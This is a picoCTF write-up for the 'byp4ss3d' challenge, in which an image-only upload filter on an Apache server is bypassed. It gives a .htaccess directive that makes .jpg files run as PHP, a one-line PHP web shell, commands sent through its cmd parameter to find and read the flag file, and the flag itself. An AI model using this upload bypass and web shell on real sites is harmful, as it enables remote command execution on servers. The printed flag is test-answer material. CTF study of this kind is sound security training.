🚩 picoCTF – byp4ss3d
📌 Challenge Description

A university registration portal allows students to upload images of their ID cards for verification. The developer implemented filters to allow only image uploads. The task is to analyze the upload mechanism and determine whether the restrictions can be bypassed to interact with the server.

🔎 Analysis

The application restricts uploads to image file extensions, blocking direct uploads of .php files.

However, the server runs Apache HTTP Server, which allows configuration through .htaccess files.

If a .htaccess file is uploaded, Apache directives can redefine how file extensions are handled within that directory.

⚡ Exploitation
1️⃣ Upload .htaccess

Create a .htaccess file containing:

AddType application/x-httpd-php .jpg

This forces Apache to treat .jpg files as PHP scripts.

2️⃣ Upload Web Shell

Upload a file named shell.jpg containing:

<?php system($_GET['cmd']); ?>

The uploaded file is stored at:

/images/shell.jpg
3️⃣ Command Execution

Commands can now be executed through the cmd parameter:

/images/shell.jpg?cmd=whoami

This confirms remote command execution.

4️⃣ Locate the Flag
/images/shell.jpg?cmd=find / -name flag*

Result:

/var/www/flag.txt
5️⃣ Retrieve the Flag
/images/shell.jpg?cmd=cat /var/www/flag.txt
🏁 Flag
picoCTF{s3rv3r_byp4ss_0c257942}
🧠 Conclusion

The vulnerability existed due to improper file upload validation and the ability to upload .htaccess configuration files. By redefining how Apache handled .jpg files, it was possible to execute arbitrary PHP code and achieve remote command execution.
